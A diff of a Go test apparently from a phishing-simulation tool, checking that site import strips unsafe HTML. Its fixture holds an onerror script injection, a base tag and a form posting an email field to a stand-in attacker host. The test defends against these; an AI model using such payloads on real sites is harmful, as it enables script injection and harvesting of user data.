@@ -56,9 +56,9 @@ func setupTest(t *testing.T) *testContext {
 	return ctx
 }
 
-func TestSiteImportDoesNotExposeActiveBaseOrRemoteImage(t *testing.T) {
+func TestSiteImportSanitizesRemoteResources(t *testing.T) {
 	ctx := setupTest(t)
-	h := "<html><head></head><body><img src=\"/test.png\"/></body></html>"
+	h := `<html><head><base href="https://attacker.example.test/"></head><body><img src="/test.png" onerror="alert(1)"><form action="https://attacker.example.test/collect"><input name="email"></form></body></html>`
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprintln(w, h)
 	}))
@@ -69,7 +69,10 @@ func TestSiteImportDoesNotExposeActiveBaseOrRemoteImage(t *testing.T) {
 	if err != nil {
 		t.Fatalf("error decoding response: %v", err)
 	}
-	if !cs.TrainingStatic || cs.Notice == "" || strings.Contains(cs.HTML, "<base") || strings.Contains(cs.HTML, `src="/test.png"`) {
-		t.Fatal("import did not apply the restricted static contract")
+	if strings.Contains(cs.HTML, "<base") || strings.Contains(cs.HTML, `src="/test.png"`) || strings.Contains(cs.HTML, "onerror") || strings.Contains(cs.HTML, "attacker.example.test/collect") {
+		t.Fatal("import retained unsafe remote metadata")
+	}
+	if !strings.Contains(cs.HTML, "<form") || !strings.Contains(cs.HTML, `name="email"`) || !strings.Contains(cs.HTML, `action=""`) {
+		t.Fatal("import removed the landing-page form")
 	}
 }
